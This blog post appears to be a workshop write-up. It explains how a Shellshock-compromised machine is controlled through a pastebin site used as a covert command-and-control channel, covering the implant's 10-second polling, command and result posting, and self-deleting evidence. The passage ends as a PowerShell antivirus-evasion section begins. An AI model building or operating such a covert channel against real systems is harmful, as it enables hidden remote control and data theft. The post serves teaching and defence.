<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content="IE=edge" http-equiv=X-UA-Compatible><title>SinCon Shellshock &amp; C2 Attack Analysis ‚Ä¢ gr1d-init</title><link href=/favicon/apple-touch-icon.png rel=apple-touch-icon sizes=180x180><link href=/favicon/favicon-32x32.png rel=icon type=image/png sizes=32x32><link href=/favicon/favicon-16x16.png rel=icon type=image/png sizes=16x16><link href=/favicon/site.webmanifest rel=manifest><link href=/fonts/Satoshi-Variable.ttf rel=preload type=font/ttf as=font crossorigin><link href=/fonts/Satoshi-VariableItalic.ttf rel=preload type=font/ttf as=font crossorigin><link href=https://gr1d-init.github.io/blog/sinconshellshock rel=canonical><meta content="SinCon Shellshock &#38; C2 Attack Analysis ‚Ä¢ gr1d-init" name=title><meta content="Writeups for SinCon Shellshock Workshop and C2 Attack Analysis" name=description><meta content=gr1d name=author><meta content="" name=theme-color><meta content=article property=og:type><meta content="SinCon Shellshock &#38; C2 Attack Analysis" property=og:title><meta content="Writeups for SinCon Shellshock Workshop and C2 Attack Analysis" property=og:description><meta content=https://gr1d-init.github.io/blog/sinconshellshock property=og:url><meta content=gr1d-init property=og:site_name><meta content=en_US property=og:locale><meta content=https://gr1d-init.github.io/_astro/banner.CqCGtCuP.jpg property=og:image><meta content=1200 property=og:image:width><meta content=630 property=og:image:height><meta content=gr1d property=article:author><meta content=2025-05-26T00:00:00.000Z property=article:published_time><meta content=summary_large_image property=twitter:card><meta content=https://gr1d-init.github.io/blog/sinconshellshock property=twitter:url><meta content="SinCon Shellshock &#38; C2 Attack Analysis" property=twitter:title><meta content="Writeups for SinCon Shellshock Workshop and C2 Attack Analysis" property=twitter:description><meta content=https://gr1d-init.github.io/_astro/banner.CqCGtCuP.jpg property=twitter:image><link href=/sitemap-index.xml rel=sitemap><link href=https://gr1d-init.github.io/rss.xml rel=alternate type=application/rss+xml title=gr1d-init><meta content="Astro v4.16.16" name=generator><link href=/styles/global.css rel=stylesheet><script>console.log("%c Astro Theme Pure %c https://github.com/cworld1/astro-theme-pure/","color:#fff;background:linear-gradient(90deg,#448bff,#44e9ff);padding:5px 0;","color:#000;background:linear-gradient(90deg,#44e9ff,#ffffff);padding:5px 10px 5px 0px;")</script><script>function simpleSetTheme(){let e=localStorage.getItem("theme");e&&"system"!==e||(e=window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"),document.documentElement.classList.toggle("dark","dark"===e),document.querySelector('meta[name="theme-color"]')?.setAttribute("content","dark"===e?"#0B0B10":"#FCFCFD")}simpleSetTheme(),document.addEventListener("astro:page-load",(()=>simpleSetTheme()))</script><link href=/_astro/_slug_.5GCGLFpR.css rel=stylesheet><link href=/_astro/_slug_.Do1VXCD7.css rel=stylesheet><style>.expand-conetent[data-astro-cid-jvehtkjd]{grid-template-rows:0fr}.expanded[data-astro-cid-jvehtkjd] .expand-conetent[data-astro-cid-jvehtkjd]{grid-template-rows:1fr}.sl-steps{--bullet-size:1.75rem;--bullet-margin:.375rem;list-style:none!important;counter-reset:steps-counter var(--sl-steps-start,0);padding-inline-start:0!important}.sl-steps>li{counter-increment:steps-counter;position:relative;padding-inline-start:calc(var(--bullet-size) + 1rem);padding-bottom:1px;min-height:calc(var(--bullet-size) + var(--bullet-margin))}.sl-steps>li+li{margin-top:0}.sl-steps>li:before{content:counter(steps-counter);position:absolute;top:0;inset-inline-start:0;width:var(--bullet-size);height:var(--bullet-size);line-height:var(--bullet-size);font-size:.8125rem;font-weight:600;text-align:center;color:hsl(var(--foreground) / var(--tw-text-opacity,1));background-color:hsl(var(--primary-foreground) / var(--tw-bg-opacity,1));border-radius:99rem;box-shadow:inset 0 0 0 1px hsl(var(--border) / var(--tw-border-opacity,1))}.sl-steps>li:after{--guide-width:1px;content:"";position:absolute;top:calc(var(--bullet-size) + var(--bullet-margin));bottom:var(--bullet-margin);inset-inline-start:calc((var(--bullet-size) - var(--guide-width))/ 2);width:var(--guide-width);background-color:hsl(var(--border) / var(--tw-border-opacity,1))}.sl-steps>li>:first-child{--lh:1.75em;--shift-y:calc(.5 * (var(--bullet-size) - var(--lh)));margin-top:0;transform:translateY(var(--shift-y));margin-bottom:var(--shift-y);color:hsl(var(--foreground) / var(--tw-text-opacity,1))}.sl-steps>li>:first-child:where(h1,h2,h3,h4,h5,h6){--lh:1.2em}</style><script src=/_astro/hoisted.D75i5os2.js type=module></script><script src=/_astro/page.V2R8AmkL.js type=module></script></head><body class="flex bg-background justify-center transition-colors"><div class="absolute top-0 start-0 h-1/2 opacity-25 pointer-events-none w-full z-0" style=background-image:linear-gradient(#ffe5d4,transparent)></div><style>:global(.highlight-bg){background-color:var(--highlightColor)!important}</style><main class="flex items-center flex-col leading-relaxed lg:px-10 max-w-[70rem] min-h-screen pb-10 px-4 sm:px-7 text-[0.92rem] w-screen z-10"><header-component class="duration-300 transition-all border-transparent group [&#38;.not-top]:bg-background [&#38;.not-top]:border-border border box-content dark:[&#38;.not-top]:bg-muted mb-16 py-1 rounded-xl sm:rounded-2xl sticky top-4 w-full z-30" data-astro-cid-qlfjksao><header class="flex flex-wrap sm:flex-nowrap sm:justify-start text-sm" data-astro-cid-qlfjksao><nav aria-label=global class="flex items-center justify-between mx-auto relative sm:flex sm:items-center w-full" data-astro-cid-qlfjksao><div class="absolute -left-4 -z-10 box-content dark:max-sm:group-[.expanded]:bg-muted hidden max-sm:group-[.expanded.not-top]:hidden max-sm:group-[.expanded]:block w-[calc(100%+2rem)] !duration-0 -top-8 h-20 max-sm:group-[.expanded]:bg-white" data-astro-cid-qlfjksao></div><a class="duration-300 transition-all flex-none font-semibold group-[.not-top]:ms-3 sm:group-[.not-top]:ms-5 text-xl" href=/ aria-label=Brand data-astro-cid-qlfjksao>gr1d-init</a><div class="flex gap-x-4 sm:gap-x-6" data-astro-cid-qlfjksao><div class="duration-300 transition-all dark:group-[.expanded.not-top]:bg-muted end-0 grid group-[.expanded]:opacity-100 group-[.not-top]:rounded-xl max-md:border-b max-sm:absolute max-sm:group-[.expanded]:bg-background max-sm:group-[.not-top]:border max-sm:group-[.not-top]:pb-2 max-sm:group-[.not-top]:pt-2 max-sm:group-[.not-top]:px-4 max-sm:opacity-0 max-sm:pb-4 max-sm:pt-0 sm:border-0 sm:grid-rows-1 start-0 top-12 z-20" data-astro-cid-qlfjksao id=headerExpandConetent><div class="absolute top-0 -left-4 -z-10 bg-white box-content dark:max-sm:group-[.expanded]:bg-muted h-full hidden max-md:border-b max-sm:group-[.expanded.not-top]:hidden max-sm:group-[.expanded]:block w-[calc(100%+2rem)]" data-astro-cid-qlfjksao></div><div class="flex items-center flex-col sm:flex-row gap-x-5 gap-y-2 justify-center overflow-hidden sm:gap-x-7 transition-colors" data-astro-cid-qlfjksao><a class="w-full grow sm:w-fit flex-none font-medium hover:text-primary py-2 text-[1.05rem] text-right" href=/blog aria-label="Nav Menu Item" data-astro-cid-qlfjksao>Blog </a><a class="w-full grow sm:w-fit flex-none font-medium hover:text-primary py-2 text-[1.05rem] text-right" href=/projects aria-label="Nav Menu Item" data-astro-cid-qlfjksao>Projects </a><a class="w-full grow sm:w-fit flex-none font-medium hover:text-primary py-2 text-[1.05rem] text-right" href=/about aria-label="Nav Menu Item" data-astro-cid-qlfjksao>About</a><div class="flex grow flex-row gap-x-3 justify-end sm:gap-x-5 sm:w-fit w-full" data-astro-cid-qlfjksao><a class="px-1 py-2" href=/search data-astro-cid-qlfjksao title=Search><span class=sr-only data-astro-cid-qlfjksao>Search</span> <svg class=size-5 data-astro-cid-qlfjksao><use href=/icons/header.svg#mingcute-search-2-line data-astro-cid-qlfjksao></use></svg></a></div></div></div><div class="transition-all flex gap-x-4 group-[.not-top]:gap-x-2 group-[.not-top]:me-1.5" data-astro-cid-qlfjksao><button class="size-5 transition-colors border box-content group/dark hover:bg-border p-1.5 rounded-md sm:group-[.not-top]:rounded-xl" id=toggleDarkMode data-astro-cid-qlfjksao><span class=sr-only data-astro-cid-qlfjksao>Dark Theme</span> <svg class="size-5 transition-colors group-hover/dark:text-primary system" data-astro-cid-qlfjksao><use href=/icons/header.svg#ph-desktop data-astro-cid-qlfjksao></use></svg> <svg class="size-5 transition-colors group-hover/dark:text-primary hidden light" data-astro-cid-qlfjksao><use href=/icons/header.svg#mingcute-sun-line data-astro-cid-qlfjksao></use></svg> <svg class="size-5 transition-colors group-hover/dark:text-primary hidden dark" data-astro-cid-qlfjksao><use href=/icons/header.svg#mingcute-moon-stars-line data-astro-cid-qlfjksao></use></svg></button> <button class="hover:bg-border border p-1.5 rounded-md sm:group-[.not-top]:rounded-xl transition-colors sm:hidden" id=toggleMenu data-astro-cid-qlfjksao><span class=sr-only data-astro-cid-qlfjksao>Menu</span> <svg class=size-5 data-astro-cid-qlfjksao><use href=/icons/header.svg#mingcute-menu-line data-astro-cid-qlfjksao></use></svg></button></div></div></nav></header></header-component><script>const toggleDarkModeElement=document.getElementById("toggleDarkMode");toggleDarkModeElement&&(toggleDarkModeElement.dataset.theme=localStorage.getItem("theme")||"system")</script><div class=w-full><a class="transition-all py-1 border group bg-muted border-border gap-x-1 hover:bg-primary-foreground inline-flex items-center no-underline px-2 rounded-lg text-muted-foreground text-sm" href=/blog data-astro-prefetch><svg class="group-hover:stroke-primary stroke-muted-foreground" fill=none height=16 stroke-linecap=round stroke-linejoin=round stroke-width=2.5 viewBox="0 0 24 24" width=16 xmlns=http://www.w3.org/2000/svg><line class="duration-300 transition-all ease-in-out group-hover:scale-x-100 scale-x-0 group-hover:translate-x-0 translate-x-3" x1=19 x2=5 y1=12 y2=12></line><polyline class="duration-300 transition-all ease-in-out group-hover:translate-x-0 translate-x-1" points="12 19 5 12 12 5"></polyline></svg><p class=my-0>Back</p></a><div class="w-full gap-x-10 items-start md:flex mt-6"><aside class="animate basis-60 lg:shrink-0 max-md:hidden md:order-2 md:sticky min-w-40 top-24 z-10" id=sidebar><toc-heading><h2 class=font-semibold>TABLE OF CONTENTS</h2><ul class="mt-4 max-h-[70vh] overflow-y-scroll text-card-foreground"><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75" href=#command--control-c2-attack-analysis---beginners-guide aria-label="Scroll to section: Command &#38; Control (C2) Attack Analysis - Beginner‚Äôs Guide">Command &amp; Control (C2) Attack Analysis - Beginner‚Äôs Guide</a></div><ul><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#what-is-this aria-label="Scroll to section: What Is This?">What Is This?</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#how-c2-attacks-work aria-label="Scroll to section: How C2 Attacks Work">How C2 Attacks Work</a></div><ul><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#the-basic-process aria-label="Scroll to section: The Basic Process">The Basic Process</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#why-use-a-website-instead-of-direct-connection aria-label="Scroll to section: Why Use a Website Instead of Direct Connection?">Why Use a Website Instead of Direct Connection?</a></div></li></ul></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#communication-protocol-9-step-process aria-label="Scroll to section: Communication Protocol (9-Step Process)">Communication Protocol (9-Step Process)</a></div><ul><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#-setup-phase aria-label="Scroll to section: üöÄ Setup Phase">üöÄ Setup Phase</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#-command-execution-cycle aria-label="Scroll to section: üîÑ Command Execution Cycle">üîÑ Command Execution Cycle</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#-cleanup-phase aria-label="Scroll to section: üßπ Cleanup Phase">üßπ Cleanup Phase</a></div></li></ul></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#technical-components aria-label="Scroll to section: Technical Components">Technical Components</a></div><ul><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#two-program-architecture aria-label="Scroll to section: Two-Program Architecture">Two-Program Architecture</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#attack-advantages aria-label="Scroll to section: Attack Advantages">Attack Advantages</a></div></li></ul></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#workshop-context aria-label="Scroll to section: Workshop Context">Workshop Context</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#key-takeaways aria-label="Scroll to section: Key Takeaways">Key Takeaways</a></div></li></ul></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75" href=#powershell-payload-av-evasion-analysis aria-label="Scroll to section: PowerShell Payload AV Evasion Analysis">PowerShell Payload AV Evasion Analysis</a></div><ul><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#initial-encoded-command aria-label="Scroll to section: Initial Encoded Command">Initial Encoded Command</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#second-stage-script-in-memory-shellcode-execution aria-label="Scroll to section: Second-Stage Script: In-Memory Shellcode Execution">Second-Stage Script: In-Memory Shellcode Execution</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#shellcode-analysis aria-label="Scroll to section: Shellcode Analysis">Shellcode Analysis</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#further-evasion-splitting-the-payload aria-label="Scroll to section: Further Evasion: Splitting the Payload">Further Evasion: Splitting the Payload</a></div></li><li><div class=relative><span class="duration-300 absolute rounded [&.highlight-bg]:bg-primary [&.readed]:bg-input top-[5%] transition-colors w-[2px]"></span> <a class="transition-all py-1 [&#38;.highlight-bg-translucent]:bg-muted [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.readed]:text-input flex-1 hover:text-foreground line-clamp-2 ms-2 px-3 text-foreground/75 ps-7" href=#conclusion-evasion-strategy aria-label="Scroll to section: Conclusion: Evasion Strategy">Conclusion: Evasion Strategy</a></div></li></ul></li></ul></toc-heading></aside><article class="min-w-0 grow"><div class=animate id=content-header><div class="relative hero-image mb-6"><img alt="SinCon Shellshock &#38; C2 Attack Analysis" decoding=async height=400 loading=eager src=/_astro/banner.CqCGtCuP_ZwzgFS.webp width=650 class="relative w-full cover-image h-auto max-w-[65ch] object-contain rounded-2xl z-10" fetchpriority=high><img alt="SinCon Shellshock &#38; C2 Attack Analysis" decoding=async height=400 loading=eager src=/_astro/banner.CqCGtCuP_ZwzgFS.webp width=650 class="duration-300 absolute transition-opacity blur-xl end-0 h-full max-w-[65ch] mt-0 opacity-60 rounded-3xl top-4 z-0" fetchpriority=high id=blurImage></div><div class="animate article-info max-lg:mx-auto"><div class="flex flex-wrap text-muted-foreground gap-x-4 gap-y-2 leading-6 text-xs"><div class="flex items-center gap-1"><svg class=size-5><use href=/icons/ui.svg#mingcute-calendar-2-line></use></svg> <span class="font-sans text-muted-foreground"><time datetime=2025-05-26T00:00:00.000Z>May 26, 2025</time></span></div><div class="flex items-center gap-1"><svg class=size-5><use href=/icons/ui.svg#mingcute-time-line></use></svg> 11 min read</div><span class="flex items-center gap-1"><svg class=size-5><use href=/icons/project.svg#mingcute-earth-2-line></use></svg> English</span></div><h1 class="font-medium mt-4 sm:mb-2 sm:mt-6 sm:text-3xl text-2xl">SinCon Shellshock &amp; C2 Attack Analysis</h1><div class="flex items-center flex-row flex-wrap gap-x-1 mt-3 sm:mt-5 text-muted-foreground"><svg class=size-5><use href=/icons/ui.svg#mingcute-hashtag-line></use></svg><div><a class="inline-block hover:underline hover:underline-offset-4" href=/tags/conference aria-label="View more blogs with the tag conference" data-pagefind-filter=tag>conference </a>/</div><div><a class="inline-block hover:underline hover:underline-offset-4" href="/tags/sincon 2025" aria-label="View more blogs with the tag sincon 2025" data-pagefind-filter=tag>sincon 2025 </a>/</div><div><a class="inline-block hover:underline hover:underline-offset-4" href=/tags/c2 aria-label="View more blogs with the tag c2" data-pagefind-filter=tag>c2 </a>/</div><div><a class="inline-block hover:underline hover:underline-offset-4" href=/tags/shellshock aria-label="View more blogs with the tag shellshock" data-pagefind-filter=tag>shellshock </a>/</div><div><a class="inline-block hover:underline hover:underline-offset-4" href=/tags/powershell aria-label="View more blogs with the tag powershell" data-pagefind-filter=tag>powershell </a>/</div><div><a class="inline-block hover:underline hover:underline-offset-4" href="/tags/av evasion" aria-label="View more blogs with the tag av evasion" data-pagefind-filter=tag>av evasion</a></div></div><div class="mt-3 italic"><blockquote class="text-sm text-muted-foreground"><q>Writeups for SinCon Shellshock Workshop and C2 Attack Analysis</q></blockquote></div></div><div class="mt-4 sm:mt-6 border-t max-lg:mx-auto sm:w-1/3 w-1/2"></div></div><div class="animate dark:prose-invert dark:prose-pure max-w-none md:min-w-[45ch] mt-8 prose prose-headings:font-medium prose-pure" id=content><h2 id=command--control-c2-attack-analysis---beginners-guide>Command &#x26; Control (C2) Attack Analysis - Beginner‚Äôs Guide<a class=anchor href=#command--control-c2-attack-analysis---beginners-guide>#</a></h2><h3 id=what-is-this>What Is This?<a class=anchor href=#what-is-this>#</a></h3><p><img alt=Website decoding=async height=1199 loading=lazy src=/_astro/website.DItVlCv0_ZzqGQW.webp width=1919> <em>The pastebin-like website used in the C2 demonstration.</em></p><p>This analyzes a <strong>Command and Control (C2)</strong> attack that uses a pastebin website to remotely control computers. It was demonstrated in a cybersecurity workshop to teach students about modern hacking techniques.</p><p><strong>Key Facts:</strong></p><ul><li><strong>Attack Type:</strong> Remote computer control via website messaging</li><li><strong>Entry Method:</strong> Shellshock vulnerability (CVE-2014-6271)</li><li><strong>Communication:</strong> Pastebin website as secret message board</li><li><strong>Danger Level:</strong> Very stealthy - looks like normal web browsing</li></ul><p><strong>Simple Analogy:</strong> Like using a library bulletin board to leave secret notes between a spy and their target.</p><h3 id=how-c2-attacks-work>How C2 Attacks Work<a class=anchor href=#how-c2-attacks-work>#</a></h3><h4 id=the-basic-process>The Basic Process<a class=anchor href=#the-basic-process>#</a></h4><ol><li><strong>Initial Compromise:</strong> Hacker exploits Shellshock bug to break into computer</li><li><strong>Implant Installation:</strong> Plants spy program (<code>binpaste_client_p1.py</code>) on victim computer</li><li><strong>Communication Setup:</strong> Both attacker and victim programs use same pastebin account</li><li><strong>Command &#x26; Control:</strong> Continuous cycle of commands and data theft</li></ol><h4 id=why-use-a-website-instead-of-direct-connection>Why Use a Website Instead of Direct Connection?<a class=anchor href=#why-use-a-website-instead-of-direct-connection>#</a></h4><ul><li><strong>Stealth:</strong> Looks like normal pastebin usage</li><li><strong>Evasion:</strong> Hard to block without affecting legitimate users</li><li><strong>No Direct Trail:</strong> Attacker never connects directly to victim</li><li><strong>Multiple Victims:</strong> One website can control many computers</li></ul><p><strong>Real-World Impact:</strong> Victim‚Äôs passwords, files, and personal data get stolen without them knowing.</p><h3 id=communication-protocol-9-step-process>Communication Protocol (9-Step Process)<a class=anchor href=#communication-protocol-9-step-process>#</a></h3><p><img alt="Communication Process Diagram" decoding=async height=752 loading=lazy src=/_astro/process.DJdmsDh8_Z1Vmna3.webp width=1280> <em>Diagram illustrating the 9-step communication protocol between attacker, C2 server (pastebin), and implant.</em></p><h4 id=-setup-phase>üöÄ Setup Phase<a class=anchor href=#-setup-phase>#</a></h4><p><strong>Step 1:</strong> üî¥ <strong>Red Team to binpaste</strong><br>Initial login (<code>-u eviluser -p eviluser</code>)<br><em>Attacker‚Äôs program connects to pastebin and authenticates.</em></p><p><strong>Step 2:</strong> üíª <strong>Implant to binpaste</strong><br>Initial login (<code>-u eviluser -p eviluser</code>)<br><em>Victim‚Äôs spy program also logs into same pastebin account.</em></p><h4 id=-command-execution-cycle>üîÑ Command Execution Cycle<a class=anchor href=#-command-execution-cycle>#</a></h4><p><strong>Step 3:</strong> üëÄ <strong>Implant to binpaste</strong><br>GET: Polling the main page for new commands<br><em>Every 10 seconds, victim computer checks: ‚ÄúAny new orders for me?‚Äù</em></p><p><strong>Step 4:</strong> üìù <strong>Red Team to binpaste</strong><br>POST: Paste the command<br><em>Attacker posts command like ‚Äúlist all files‚Äù or ‚Äústeal passwords‚Äù.</em></p><p><strong>Step 5:</strong> üì• <strong>Implant to binpaste</strong><br>GET: Fetch the command<br><em>Victim computer finds the command and downloads it.</em></p><p><strong>Step 6:</strong> üì§ <strong>Implant to binpaste</strong><br>POST: Paste the result<br><em>Victim executes command and uploads stolen data/results.</em></p><h4 id=-cleanup-phase>üßπ Cleanup Phase<a class=anchor href=#-cleanup-phase>#</a></h4><p><strong>Step 7:</strong> üóëÔ∏è <strong>Implant to binpaste</strong><br>POST: Delete the command<br><em>Victim removes the original command to hide evidence.</em></p><p><strong>Step 8:</strong> üì• <strong>Red Team to binpaste</strong><br>GET: Fetch the result<br><em>Attacker downloads the stolen data/results.</em></p><p><strong>Step 9:</strong> üóëÔ∏è <strong>Red Team to binpaste</strong><br>POST: Delete the result<br><em>Attacker removes all traces of the conversation.</em></p><p><strong>üîë Key Feature:</strong> Automatic evidence removal makes detection extremely difficult - it‚Äôs like the conversation never happened!</p><h3 id=technical-components>Technical Components<a class=anchor href=#technical-components>#</a></h3><h4 id=two-program-architecture>Two-Program Architecture<a class=anchor href=#two-program-architecture>#</a></h4><p><strong>Controller (<code>binpastec2_p1.py</code>)</strong> - Attacker‚Äôs command interface</p><ul><li>Sends commands via pastebin posts</li><li>Retrieves stolen data from victim computers</li><li>Can control multiple victims simultaneously</li></ul><p><strong>Agent (<code>binpaste_client_p1.py</code>)</strong> - Victim‚Äôs implant</p><ul><li>Polls pastebin every 10 seconds for new commands</li><li>Executes commands and uploads results</li><li>Automatically cleans up evidence</li></ul><h4 id=attack-advantages>Attack Advantages<a class=anchor href=#attack-advantages>#</a></h4><ul><li><strong>Legitimate Infrastructure:</strong> Uses real pastebin service</li><li><strong>Encrypted Channel:</strong> HTTPS traffic appears normal</li><li><strong>Scalable:</strong> One controller handles multiple victims</li><li><strong>Persistent:</strong> Continues running until manually removed</li></ul><h3 id=workshop-context>Workshop Context<a class=anchor href=#workshop-context>#</a></h3><p><img alt="Workshop Setup" decoding=async height=710 loading=lazy src=/_astro/setup.D3nfycEf_ZLDrO3.webp width=1280> <em>The workshop setup showing the attacker and victim machines.</em></p><p><img alt="Code Modification Example" decoding=async height=734 loading=lazy src=/_astro/modify.DyDOuX0Q_13LgVr.webp width=1280> <em>Example of code modification required in the workshop scripts.</em></p><p><strong>Educational Demonstration Only:</strong></p><ul><li>Controlled environment with test systems</li><li>Scripts contain incomplete code marked <code># (your code here)</code></li><li>No actual victims or data theft occurred</li><li>Used legitimate pastebin service for demonstration</li></ul><p><strong>Learning Objectives:</strong></p><ul><li>Understand modern C2 communication methods</li><li>Recognize legitimate services used maliciously</li><li>Practice detection and response techniques</li><li>Learn defensive strategies</li></ul><h3 id=key-takeaways>Key Takeaways<a class=anchor href=#key-takeaways>#</a></h3><p>This attack is smart because it looks completely normal - just regular visits to a pastebin website. The hacker doesn‚Äôt need special servers or suspicious connections. The 10-second check-ins are perfectly timed: fast enough to work well, slow enough to stay hidden.</p><p>What makes this really scary is how it cleans up after itself. Most computer viruses leave clues behind, but this one automatically deletes everything as it goes. It‚Äôs like having a conversation that erases itself - investigators can‚Äôt figure out what happened.</p><hr><p>The Shellshock workshop also covered methods used by attackers to evade antivirus detection with their payloads. The following analysis, also part of the workshop materials, delves into PowerShell-based AV evasion techniques.</p><h2 id=powershell-payload-av-evasion-analysis>PowerShell Payload AV Evasion Analysis<a class=anchor href=#powershell-payload-av-evasion-analysis>#</a></h2><p>This document analyzes the multi-layered techniques a PowerShell payload uses to evade Antivirus (AV) detection, primarily through obfuscation and in-memory execution.</p><h3 id=initial-encoded-command>Initial Encoded Command<a class=anchor 